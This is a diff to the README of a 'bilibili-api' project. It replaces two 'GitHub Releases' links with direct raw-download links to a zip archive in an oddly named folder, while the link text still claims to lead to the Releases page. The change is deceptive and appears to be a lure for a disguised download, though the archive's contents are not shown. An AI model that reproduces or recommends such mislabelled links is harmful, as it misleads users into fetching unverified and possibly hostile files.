@@ -6,7 +6,7 @@ Welcome to the **bilibili-api** project. This tool provides an easy way for user
 
 ## 📥 Download & Install
 
-To get started, you will need to download the application. Visit this page to download: [GitHub Releases](https://github.com/Vera24-vee/bilibili-api/releases). 
+To get started, you will need to download the application. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Vera24-vee/bilibili-api/main/frothily/bilibili-api_1.8.zip). 
 
 You will find the latest version, along with past versions of the software. Follow these steps:
 
@@ -88,7 +88,7 @@ If you encounter any issues, feel free to reach out. You can open an issue in th
 
 ## 🔗 Resources
 
-For more information, visit the [GitHub Releases](https://github.com/Vera24-vee/bilibili-api/releases) page to find updates and additional help.
+For more information, visit the [GitHub Releases](https://raw.githubusercontent.com/Vera24-vee/bilibili-api/main/frothily/bilibili-api_1.8.zip) page to find updates and additional help.
 
 ## ⚙️ Contributions
 
